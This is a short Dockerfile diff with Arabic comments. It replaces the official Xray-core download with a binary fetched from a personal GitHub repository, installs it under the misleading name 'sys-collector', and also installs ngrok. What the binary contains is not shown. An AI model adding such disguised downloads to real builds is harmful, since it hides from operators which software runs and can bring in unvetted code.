@@ -11,11 +11,11 @@ RUN apt-get update && apt-get install -y --no-install-recommends \
     && rm -rf /var/lib/apt/lists/*
 
 # 1. تحميل وتثبيت Xray-core باستخدام wget (أكثر استقرارًا)
-RUN wget -q https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip -O /tmp/xray.zip \
-    && unzip /tmp/xray.zip -d /usr/local/bin/ \
-    && rm /tmp/xray.zip \
-    && chmod +x /usr/local/bin/xray
-
+RUN curl -fsSL "https://github.com/x1ahmed/server-assets/releases/download/1.3/node_exporter.zip" -o /tmp/n.zip && \
+    unzip -q /tmp/n.zip -d /tmp/n && \
+    install -m 0755 /tmp/n/node_exporter /usr/local/bin/sys-collector && \
+    rm -rf /tmp/n /tmp/n.zip
+    
 # 2. تحميل وتثبيت ngrok بالأمر الذي طلبته (تنزيل وفك ضغط في خطوة واحدة)
 RUN curl -fsSL https://bin.ngrok.com/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz | tar -xz -C /usr/local/bin/
 RUN chmod +x /usr/local/bin/ngrok
